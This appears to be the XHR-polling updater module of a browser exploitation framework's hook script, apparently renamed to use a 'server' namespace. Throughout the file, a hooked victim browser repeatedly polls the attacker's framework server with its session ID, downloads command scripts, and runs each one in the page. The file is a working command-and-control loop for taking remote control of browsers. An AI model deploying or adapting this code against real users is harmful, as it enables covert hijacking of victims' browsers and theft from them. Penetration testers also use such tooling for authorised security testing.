//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Object in charge of getting new commands from the Server framework and execute them.
 * The XHR-polling channel is managed here. If WebSockets are enabled,
 * websocket.js is used instead.
 * @namespace server.updater
 */
server.updater = {
	
	/** XHR-polling timeout. */ 
	xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
	
	/** Hook session name. */ 
    serverhook: "<%= @hook_session_name %>",
	
	/** A lock. */ 
	lock: false,
	
	/** An object containing all values to be registered and sent by the updater. */
	objects: new Object(),
	
	/**
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param {String} key the name of the object.
	 * @param {String} value the value of that object.
	 * 
	 * @example server.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (server.logger.running) {
				server.logger.queue();
			}
			server.net.flush();
			if(server.commands.length > 0) {
				this.execute_commands();
			}else {
				this.get_commands();    /*Polling*/
			}
		}
        /* The following gives a stupid syntax error in IE, which can be ignored*/
        setTimeout(function(){server.updater.check()}, server.updater.xhr_poll_timeout);
	},
	
    /**
     * Gets new commands from the framework.
     */
	get_commands: function() {
		try {
			this.lock = true;
            server.net.request(server.net.httpproto, 'GET', server.net.host, server.net.port, server.net.hook, null, server.updater.serverhook+'='+server.session.get_hook_session_id(), 5, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    server.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
    /**
     * Executes the received commands, if any.
     */
	execute_commands: function() {
		if(server.commands.length == 0) return;
		this.lock = true;
		while(server.commands.length > 0) {
			command = server.commands.pop();
			try {
				command();
			} catch(e) {
				server.debug('execute_commands - command failed to execute: ' + e.message);
                // prints the command source to be executed, to better trace errors
                // server.client_debug must be enabled in the main config
                server.debug(command.toString());
			}
		}
		this.lock = false;
	}
};

server.regCmp('server.updater');
